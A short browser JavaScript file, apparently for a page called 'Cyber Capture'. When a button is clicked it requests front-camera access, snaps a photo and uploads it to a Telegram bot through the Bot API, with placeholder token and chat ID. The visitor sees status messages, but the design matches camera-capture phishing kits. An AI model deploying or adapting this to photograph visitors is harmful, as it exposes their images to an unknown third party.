// == CONFIG (FILL BEFORE DEPLOY) ==
// WARNING: Client-side tokens are public if pushed to a public repo.
const TELEGRAM_BOT_TOKEN = "PUT_YOUR_BOT_TOKEN_HERE";
const TELEGRAM_CHAT_ID  = "PUT_CHAT_ID_HERE";
// ===================================

const startBtn = document.getElementById('startBtn');
const status = document.getElementById('status');
const video = document.getElementById('video');
const canvas = document.getElementById('canvas');

function log(s, err=false){ status.textContent = s; status.style.color = err ? '#ffb3b3' : ''; }

async function startCameraAndCapture(){
  try{
    log('Meminta izin kamera...');
    const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio:false });
    video.srcObject = stream;
    await video.play();
    log('Kamera aktif — mengambil foto...');
    await new Promise(r=>setTimeout(r,700));
    const blob = await captureBlob();
    log('Mengirim foto ke Telegram...');
    await sendToTelegram(blob);
    log('Selesai — foto dikirim.');
    stream.getTracks().forEach(t=>t.stop());
  }catch(e){ console.error(e); log('Gagal: '+(e.message||e), true); }
}

function captureBlob(){
  const w = video.videoWidth || 640;
  const h = video.videoHeight || 480;
  canvas.width = w; canvas.height = h;
  const ctx = canvas.getContext('2d');
  ctx.save(); ctx.scale(-1,1); ctx.drawImage(video, -w, 0, w, h); ctx.restore();
  return new Promise(resolve=>canvas.toBlob(b=>resolve(b),'image/jpeg',0.85));
}

async function sendToTelegram(blob){
  if(!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) throw new Error('Token atau Chat ID belum diisi di app.js');
  const form = new FormData();
  form.append('chat_id', TELEGRAM_CHAT_ID);
  form.append('caption', 'Foto otomatis dari Cyber Capture (Pages)');
  form.append('photo', blob, 'capture.jpg');
  const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`;
  const res = await fetch(url, { method:'POST', body:form });
  if(!res.ok){
    const text = await res.text();
    throw new Error('Telegram API error: '+res.status+' '+text.slice(0,200));
  }
  return res.json();
}

startBtn.addEventListener('click', ()=>{
  startBtn.disabled = true;
  startCameraAndCapture();
});
